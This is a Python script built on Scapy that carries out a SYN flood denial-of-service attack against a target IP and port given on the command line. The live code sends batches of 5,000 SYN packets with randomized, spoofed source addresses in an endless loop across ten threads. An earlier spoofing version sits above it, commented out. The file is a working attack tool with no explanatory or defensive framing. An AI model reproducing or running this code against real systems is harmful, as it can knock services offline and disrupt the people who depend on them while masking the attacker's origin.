# from scapy.all import *
# from threading import Thread
# from sys import argv


# def syn_flood(dst_ip, dst_port):
#     for i in range(254):
#         src_ip = f"192.168.124.{i}"
#         # print(f"Sending SYN packet from {src_ip}:{i} to {dst_ip}:{dst_port}")
#         if src_ip != dst_ip:
#             pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=i, dport=dst_port, flags="S")
#             send(pkt, verbose=0)

# if __name__ == "__main__":
#     if len(sys.argv) != 3:
#         print("Usage: python3 syn_flood.py <ip> <port>")
#         sys.exit(1)

#     dst_ip = argv[1]
#     dst_port = int(argv[2])

#     while True:
#         syn_flood(dst_ip, dst_port)

from scapy.all import *
from threading import Thread
from sys import argv


def syn_flood(dst_ip, dst_port, batch=5000):
    pkts = [IP(dst=dst_ip, src=RandIP()) /
            TCP(dport=dst_port, sport=RandShort(),
                flags="S", seq=RandInt())
            for _ in range(batch)]

    send(pkts, inter=0, loop=1, verbose=False)

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 syn_flood.py <ip> <port>")
        sys.exit(1)

    dst_ip = argv[1]
    dst_port = int(argv[2])

    for _ in range(10):
        t = Thread(target=syn_flood, args=(dst_ip, dst_port))
        t.daemon = True
        t.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping SYN flood...")
        sys.exit(0)

if __name__ == "__main__":
    main()

